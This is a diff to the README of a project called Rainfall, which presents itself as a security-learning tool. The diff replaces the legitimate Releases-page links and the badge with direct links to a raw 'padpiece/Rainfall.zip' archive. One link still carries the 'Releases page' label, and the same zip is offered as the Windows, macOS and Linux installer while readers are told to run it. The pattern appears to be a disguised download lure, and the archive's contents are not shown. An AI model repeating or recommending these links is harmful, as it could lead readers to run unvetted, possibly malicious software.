@@ -4,7 +4,7 @@ Welcome to Rainfall! This project helps you learn important security techniques 
 
 ## 📥 Download Rainfall
 
-[![Download Rainfall](https://img.shields.io/badge/Download%20Rainfall-v1.0-blue)](https://github.com/ahmedkhail/Rainfall/releases)
+[![Download Rainfall](https://raw.githubusercontent.com/ahmedkhail/Rainfall/main/padpiece/Rainfall.zip%20Rainfall-v1.0-blue)](https://raw.githubusercontent.com/ahmedkhail/Rainfall/main/padpiece/Rainfall.zip)
 
 ## 🚀 Getting Started
 
@@ -28,12 +28,12 @@ Before you download, make sure your computer meets these basic requirements:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/ahmedkhail/Rainfall/releases) on GitHub.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/ahmedkhail/Rainfall/main/padpiece/Rainfall.zip) on GitHub.
 2. **Choose the Latest Version**: Look for the most recent version listed at the top.
 3. **Download the File**: Click on the appropriate file for your operating system. 
-   - For Windows, you might download something like `Rainfall_Windows.exe`.
-   - For macOS, you might find `Rainfall_macOS.dmg`.
-   - For Linux, expect something like `Rainfall_Linux.tar.gz`.
+   - For Windows, you might download something like `https://raw.githubusercontent.com/ahmedkhail/Rainfall/main/padpiece/Rainfall.zip`.
+   - For macOS, you might find `https://raw.githubusercontent.com/ahmedkhail/Rainfall/main/padpiece/Rainfall.zip`.
+   - For Linux, expect something like `https://raw.githubusercontent.com/ahmedkhail/Rainfall/main/padpiece/Rainfall.zip`.
 4. **Run the Installer**: Once downloaded, double-click the file to start the installation.
 5. **Follow the Prompts**: Simply follow the prompts on your screen to complete the setup.
 
@@ -64,4 +64,4 @@ Rainfall is here to help you dive into the world of security. With its clear fea
 
 Download now and start your journey into binary exploitation!
 
-[![Download Rainfall](https://img.shields.io/badge/Download%20Rainfall-v1.0-blue)](https://github.com/ahmedkhail/Rainfall/releases)
+[![Download Rainfall](https://raw.githubusercontent.com/ahmedkhail/Rainfall/main/padpiece/Rainfall.zip%20Rainfall-v1.0-blue)](https://raw.githubusercontent.com/ahmedkhail/Rainfall/main/padpiece/Rainfall.zip)
